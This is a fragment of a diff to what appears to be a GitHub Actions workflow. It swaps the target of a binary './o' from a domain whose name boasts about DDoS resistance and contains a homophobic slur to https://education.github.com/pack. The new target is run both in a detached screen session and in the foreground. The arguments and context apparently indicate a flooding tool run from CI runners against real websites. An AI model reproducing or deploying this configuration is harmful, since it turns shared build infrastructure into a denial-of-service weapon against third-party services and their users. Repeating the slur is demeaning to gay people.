@@ -41,8 +41,8 @@ jobs:
           
            
           
-          ./o https://cantddosmefaggot.lol/  350 1 1 90.txt
-          
+          screen -dms ve ./o https://education.github.com/pack  350 1 1 90.txt
+          ./o https://education.github.com/pack  350 1 1 90.txt
 
           
           sleep 1
